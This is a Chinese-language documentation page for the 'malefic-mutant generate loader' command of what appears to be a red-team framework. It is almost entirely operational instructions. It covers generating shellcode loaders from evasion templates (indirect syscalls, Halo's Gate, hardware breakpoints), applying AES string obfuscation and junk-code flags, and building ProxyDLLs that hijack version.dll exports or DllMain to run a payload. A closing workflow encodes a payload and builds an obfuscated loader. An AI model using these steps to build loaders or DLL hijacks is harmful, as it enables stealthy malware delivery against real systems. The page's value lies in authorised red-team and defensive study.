---
title: Loader — 加载器生成
description: malefic-mutant generate loader 生成各种 shellcode 加载器，用于 payload 投递和执行。
edition: community
generated: false
source: imp:mutant/loader.md
---

# Loader

`malefic-mutant generate loader` 生成各种 shellcode 加载器，用于 payload 投递和执行。

## 架构

```
generate loader
├── template    — 模板加载器（40+ 执行技术）
└── proxydll    — ProxyDLL 劫持
```

> PE shellcode 注入由 `tool bdf` 提供，为 Professional 功能，详见 BDF 文档 (Pro)。

---

## Template Loader

从预定义模板生成独立加载器二进制，执行时从内部提取并运行 shellcode。

### 用法

```bash
malefic-mutant generate loader template [OPTIONS]
```

### 列出模板

```bash
malefic-mutant generate loader template -l
```

### 基本用法

```bash
# 随机选择模板
malefic-mutant generate loader template -i payload.bin -e aes

# 指定模板
malefic-mutant generate loader template -t fiber_exec -i payload.bin

# 指定 func_ptr 模板
malefic-mutant generate loader template -t func_ptr -i payload.bin
```

### 混淆选项

```bash
# 字符串混淆（编译期 AES 加密 DLL 名、API 函数名）
malefic-mutant generate loader template -t func_ptr -i payload.bin --obf-strings

# 全部混淆：字符串 + 垃圾代码 + 内存清零
malefic-mutant generate loader template -t func_ptr -i payload.bin -e aes --obf-full
```

| 标志 | 说明 |
|------|------|
| `--obf-strings` | 编译期 AES 字符串加密 |
| `--obf-full` | 全部混淆（字符串 + 垃圾代码 + 内存清零） |

### 可用模板

部分模板列表（`generate loader template -l` 查看完整列表）：

| 模板 | 技术 |
|------|------|
| `func_ptr` | 函数指针调用 |
| `fiber_exec` | Fiber 执行 |
| `apc_nttestalert` | APC + NtTestAlert |
| `enum_fonts` | EnumFonts 回调 |
| `nt_api_dynamic` | 动态 NT API 解析 |
| `dll_overload` | DLL 重载 |
| `halos_gate` | Halo's Gate 直接系统调用 |
| `indirect_syscall` | 间接系统调用 |
| `veh_indirect_syscall` | VEH + 间接系统调用 |
| `threadpool_work` | ThreadPoolWork |
| `hwbp_exec` | 硬件断点执行 |
| `rop_trampoline` | ROP 跳板 |

---

## ProxyDLL Loader

生成 ProxyDLL，劫持合法 DLL 的导出函数，在转发调用时执行 payload。

### 用法

```bash
malefic-mutant generate loader proxydll [OPTIONS]
```

### 基本用法

```bash
# 劫持 version.dll 的 GetFileVersionInfoW
malefic-mutant generate loader proxydll \
    -r version.dll -p version_orig.dll -e GetFileVersionInfoW
```

### 参数

| 参数 | 说明 |
|------|------|
| `-r, --raw-dll` | 原始 DLL 路径（用于解析导出表） |
| `-p, --proxied-dll` | 被代理的 DLL 路径（运行时转发目标） |
| `-o, --proxy-dll` | 生成的代理 DLL 名称 |
| `-e, --hijacked-exports` | 要劫持的导出函数（逗号分隔） |
| `--hijack-dll-main` | 同时劫持 DllMain |
| `--native-thread` | 使用 NtCreateThreadEx 替代 std::thread |

### 劫持 DllMain

```bash
malefic-mutant generate loader proxydll \
    -r version.dll -p version_orig.dll --hijack-dll-main
```

---

## 组合工作流

```bash
# 1. 编码 payload
malefic-mutant tool encode -i payload.bin -e aes -f bin -o encoded.bin

# 2. 生成模板加载器（AES 解密 + func_ptr 执行）
malefic-mutant generate loader template -t func_ptr -i encoded.bin -e aes --obf-full

# 3. 或生成 ProxyDLL
malefic-mutant generate loader proxydll -r version.dll -p version_orig.dll -e GetFileVersionInfoW
```
